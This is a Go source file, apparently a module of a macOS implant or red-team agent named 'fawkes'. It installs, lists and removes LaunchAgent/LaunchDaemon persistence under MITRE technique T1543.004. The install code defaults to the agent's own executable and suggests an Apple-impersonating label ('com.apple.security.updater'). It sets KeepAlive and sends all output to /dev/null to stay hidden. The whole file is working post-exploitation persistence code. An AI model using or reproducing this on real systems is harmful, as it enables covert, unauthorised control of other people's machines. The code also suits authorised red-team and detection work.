//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type LaunchAgentCommand struct{}

func (c *LaunchAgentCommand) Name() string {
	return "launchagent"
}

func (c *LaunchAgentCommand) Description() string {
	return "Install, remove, or list macOS LaunchAgent/LaunchDaemon persistence (T1543.004)"
}

type launchAgentArgs struct {
	Action   string `json:"action"`
	Label    string `json:"label"`
	Path     string `json:"path"`
	Args     string `json:"args"`
	RunAt    string `json:"run_at"`
	Interval int    `json:"interval"`
	Daemon   bool   `json:"daemon"`
}

func (c *LaunchAgentCommand) Execute(task structs.Task) structs.CommandResult {
	var args launchAgentArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use action: install, remove, list",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "install":
		return launchAgentInstall(args)
	case "remove":
		return launchAgentRemove(args)
	case "list":
		return launchAgentList(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: install, remove, list", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// getPlistDir returns the appropriate LaunchAgent or LaunchDaemon directory
func getPlistDir(daemon bool) (string, error) {
	if daemon {
		// System-wide LaunchDaemon — requires root
		return "/Library/LaunchDaemons", nil
	}
	// User-level LaunchAgent
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("cannot determine current user: %v", err)
	}
	return filepath.Join(u.HomeDir, "Library", "LaunchAgents"), nil
}

// launchAgentInstall creates a LaunchAgent or LaunchDaemon plist
func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
	if args.Label == "" {
		return structs.CommandResult{
			Output:    "Error: label is required (e.g., com.apple.security.updater)",
			Status:    "error",
			Completed: true,
		}
	}

	// Default to current executable if no path specified
	programPath := args.Path
	if programPath == "" {
		exe, err := os.Executable()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error getting executable path: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		programPath = exe
	}

	plistDir, err := getPlistDir(args.Daemon)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Ensure the directory exists
	if err := os.MkdirAll(plistDir, 0755); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating directory %s: %v", plistDir, err),
			Status:    "error",
			Completed: true,
		}
	}

	plistPath := filepath.Join(plistDir, args.Label+".plist")

	// Build program arguments array
	var programArgs []string
	programArgs = append(programArgs, programPath)
	if args.Args != "" {
		programArgs = append(programArgs, strings.Fields(args.Args)...)
	}

	// Build the plist XML
	plist := buildPlist(args.Label, programArgs, args.RunAt, args.Interval, args.Daemon)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing plist: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine type description
	plistType := "LaunchAgent"
	if args.Daemon {
		plistType = "LaunchDaemon"
	}

	triggerDesc := "RunAtLoad (on login)"
	if args.Interval > 0 {
		triggerDesc += fmt.Sprintf(" + every %ds", args.Interval)
	}
	if args.RunAt != "" {
		triggerDesc = fmt.Sprintf("Calendar: %s", args.RunAt)
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("Installed %s persistence:\n  Label:   %s\n  Path:    %s\n  Plist:   %s\n  Trigger: %s",
			plistType, args.Label, programPath, plistPath, triggerDesc),
		Status:    "success",
		Completed: true,
	}
}

// launchAgentRemove removes a LaunchAgent or LaunchDaemon plist
func launchAgentRemove(args launchAgentArgs) structs.CommandResult {
	if args.Label == "" {
		return structs.CommandResult{
			Output:    "Error: label is required to identify the plist to remove",
			Status:    "error",
			Completed: true,
		}
	}

	plistDir, err := getPlistDir(args.Daemon)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	plistPath := filepath.Join(plistDir, args.Label+".plist")
	if err := os.Remove(plistPath); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error removing %s: %v", plistPath, err),
			Status:    "error",
			Completed: true,
		}
	}

	plistType := "LaunchAgent"
	if args.Daemon {
		plistType = "LaunchDaemon"
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Removed %s: %s\nNote: Run 'launchctl remove %s' to unload if currently loaded", plistType, plistPath, args.Label),
		Status:    "success",
		Completed: true,
	}
}

// launchAgentList enumerates LaunchAgent and LaunchDaemon plists
func launchAgentList(args launchAgentArgs) structs.CommandResult {
	var lines []string
	lines = append(lines, "=== macOS Persistence ===\n")

	// List user LaunchAgents
	userDir, err := getPlistDir(false)
	if err == nil {
		lines = append(lines, fmt.Sprintf("--- User LaunchAgents: %s ---", userDir))
		lines = append(lines, listPlistDir(userDir)...)
		lines = append(lines, "")
	}

	// List system LaunchAgents
	lines = append(lines, "--- System LaunchAgents: /Library/LaunchAgents ---")
	lines = append(lines, listPlistDir("/Library/LaunchAgents")...)
	lines = append(lines, "")

	// List LaunchDaemons
	lines = append(lines, "--- LaunchDaemons: /Library/LaunchDaemons ---")
	lines = append(lines, listPlistDir("/Library/LaunchDaemons")...)

	return structs.CommandResult{
		Output:    strings.Join(lines, "\n"),
		Status:    "success",
		Completed: true,
	}
}

// listPlistDir reads a directory and returns formatted plist entries
func listPlistDir(dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return []string{fmt.Sprintf("  Error: %v", err)}
	}

	if len(entries) == 0 {
		return []string{"  (empty)"}
	}

	var lines []string
	for _, e := range entries {
		if !strings.HasSuffix(e.Name(), ".plist") {
			continue
		}
		info, _ := e.Info()
		size := int64(0)
		if info != nil {
			size = info.Size()
		}
		label := strings.TrimSuffix(e.Name(), ".plist")
		lines = append(lines, fmt.Sprintf("  %s (%d bytes)", label, size))
	}

	if len(lines) == 0 {
		return []string{"  (no plist files)"}
	}
	return lines
}

// buildPlist generates a macOS plist XML for a LaunchAgent or LaunchDaemon
func buildPlist(label string, programArgs []string, runAt string, interval int, daemon bool) string {
	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>` + label + `</string>
	<key>ProgramArguments</key>
	<array>
`)
	for _, arg := range programArgs {
		sb.WriteString("\t\t<string>" + xmlEscape(arg) + "</string>\n")
	}
	sb.WriteString("\t</array>\n")

	// RunAtLoad — start when loaded (login or boot)
	sb.WriteString("\t<key>RunAtLoad</key>\n\t<true/>\n")

	// KeepAlive — restart if it dies
	sb.WriteString("\t<key>KeepAlive</key>\n\t<true/>\n")

	// StartInterval — periodic execution
	if interval > 0 {
		sb.WriteString(fmt.Sprintf("\t<key>StartInterval</key>\n\t<integer>%d</integer>\n", interval))
	}

	// StartCalendarInterval — cron-like scheduling
	if runAt != "" {
		sb.WriteString(buildCalendarInterval(runAt))
	}

	// StandardOutPath and StandardErrorPath — hide output
	sb.WriteString("\t<key>StandardOutPath</key>\n\t<string>/dev/null</string>\n")
	sb.WriteString("\t<key>StandardErrorPath</key>\n\t<string>/dev/null</string>\n")

	sb.WriteString("</dict>\n</plist>\n")
	return sb.String()
}

// xmlEscape escapes special XML characters
func xmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	return s
}

// buildCalendarInterval converts a simple time string to plist format
// Supports: "HH:MM" (daily at time), "weekday HH:MM" (e.g., "1 09:00" = Monday at 9am)
func buildCalendarInterval(runAt string) string {
	parts := strings.Fields(runAt)
	var sb strings.Builder
	sb.WriteString("\t<key>StartCalendarInterval</key>\n\t<dict>\n")

	if len(parts) == 2 {
		// "weekday HH:MM"
		sb.WriteString(fmt.Sprintf("\t\t<key>Weekday</key>\n\t\t<integer>%s</integer>\n", parts[0]))
		timeParts := strings.Split(parts[1], ":")
		if len(timeParts) == 2 {
			sb.WriteString(fmt.Sprintf("\t\t<key>Hour</key>\n\t\t<integer>%s</integer>\n", timeParts[0]))
			sb.WriteString(fmt.Sprintf("\t\t<key>Minute</key>\n\t\t<integer>%s</integer>\n", timeParts[1]))
		}
	} else if len(parts) == 1 {
		// "HH:MM"
		timeParts := strings.Split(parts[0], ":")
		if len(timeParts) == 2 {
			sb.WriteString(fmt.Sprintf("\t\t<key>Hour</key>\n\t\t<integer>%s</integer>\n", timeParts[0]))
			sb.WriteString(fmt.Sprintf("\t\t<key>Minute</key>\n\t\t<integer>%s</integer>\n", timeParts[1]))
		}
	}

	sb.WriteString("\t</dict>\n")
	return sb.String()
}
